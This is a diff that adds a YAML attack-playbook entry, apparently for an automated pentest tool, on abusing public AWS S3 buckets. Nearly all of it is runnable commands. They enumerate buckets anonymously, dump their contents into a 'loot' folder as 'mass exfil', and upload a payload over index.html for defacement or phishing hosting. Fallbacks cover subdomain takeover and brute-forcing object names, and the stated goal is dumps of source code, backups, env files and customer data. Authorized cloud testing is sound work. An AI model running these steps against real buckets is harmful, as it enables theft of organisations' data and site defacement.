@@ -1,0 +1,49 @@
+id: cloud_aws_s3_public
+title: "AWS S3 — public bucket enum + ACL misconfig + write abuse"
+phase: recon
+mitre: ["T1530", "T1213.003"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443]
+  technologies: ["aws", "s3", "amazonaws.com"]
+  cves: []
+keywords: ["s3", "bucket", "public bucket", "s3 enum", "amazonaws.com"]
+preconditions:
+  - "Target organisation name OR list of suspected bucket prefixes"
+  - "AWS CLI installed (no creds needed for unauth probes)"
+steps:
+  - tool: s3scanner
+    cmd:  "s3scanner scan --buckets-file buckets.txt"
+    why:  "Mass-check bucket existence + permissions (Read/Write ACL, AuthenticatedUsers vs AllUsers)"
+  - tool: aws-cli
+    cmd:  "aws s3 ls s3://{bucket_name}/ --no-sign-request"
+    why:  "Anonymous listing — works on AllUsers:READ ACL"
+  - tool: aws-cli
+    cmd:  "aws s3api get-bucket-acl --bucket {bucket_name} --no-sign-request"
+    why:  "Confirm ACL — flag any 'AllUsers' or 'AuthenticatedUsers' grant"
+  - tool: aws-cli
+    cmd:  "aws s3api get-bucket-policy --bucket {bucket_name} --no-sign-request | jq ."
+    why:  "Bucket policy text — sometimes more permissive than ACLs"
+  - tool: aws-cli
+    cmd:  "aws s3 sync s3://{bucket_name}/ ./loot-{bucket_name}/ --no-sign-request"
+    why:  "Mass exfil of public bucket contents"
+  - tool: aws-cli
+    cmd:  "aws s3 cp ./payload.html s3://{bucket_name}/index.html --no-sign-request"
+    why:  "Test write — if it succeeds, defacement / phishing-page hosting / supply-chain risk"
+  - tool: bucket-stream
+    cmd:  "bucket-stream"
+    why:  "Real-time CT-log → bucket-name probe — finds buckets at registration time"
+  - tool: cloud_enum
+    cmd:  "cloud_enum -k {keyword}"
+    why:  "Multi-cloud enum (AWS + Azure + GCP) by org keyword"
+  - tool: aws-cli
+    cmd:  "aws s3api list-objects-v2 --bucket {bucket_name} --prefix backup/ --no-sign-request"
+    why:  "Targeted prefix scan — backup/, db/, .env, .git/ commonly leak"
+expected_outcome: "Anonymous bucket dump containing source code, DB backups, env files, customer data"
+fallbacks:
+  - "Bucket exists but listing denied → try direct object names from leaked URLs / source-map references"
+  - "Subdomain takeover via dangling CNAME → bucket name available for re-registration"
+  - "GetObject anon allowed but ListObjects not → enumerate via wordlist (S3 doesn't return 403/404 difference for non-existent keys)"
+references:
+  - "https://github.com/sa7mon/S3Scanner"
+  - "https://book.hacktricks.xyz/cloud-security/pentesting-cloud/aws-pentesting"
